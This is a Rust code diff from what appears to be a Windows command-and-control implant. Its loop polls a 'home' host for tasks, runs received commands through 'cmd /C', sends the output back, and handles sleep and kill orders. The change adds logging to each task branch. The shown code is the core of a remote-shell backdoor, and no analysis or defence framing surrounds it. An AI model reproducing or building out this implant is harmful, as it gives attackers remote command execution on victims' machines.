@@ -18,6 +18,7 @@ pub fn run(home: SocketAddrV4) -> windows::core::Result<()> {
     loop {
         match beacon.get_task()? {
             Task::Exec(cmd_bytes) => {
+                log::info!("got exec task! payload: {:?}", cmd_bytes);
                 let cmd = String::from_utf8_lossy(&cmd_bytes).to_string();
 
                 let output = Command::new("cmd").args(&["/C", &cmd]).output();
@@ -29,8 +30,14 @@ pub fn run(home: SocketAddrV4) -> windows::core::Result<()> {
 
                 beacon.send_exec_result(result_bytes)?;
             }
-            Task::Sleep(dur) => std::thread::sleep(dur),
-            Task::Kill(_) => std::process::exit(0),
+            Task::Sleep(dur) => {
+                log::info!("got sleep tasK! sleeping for {} seconds", dur.as_secs());
+                std::thread::sleep(dur);
+            }
+            Task::Kill => {
+                log::info!("got kill task, committing suicide");
+                std::process::exit(0);
+            }
         }
     }
 }
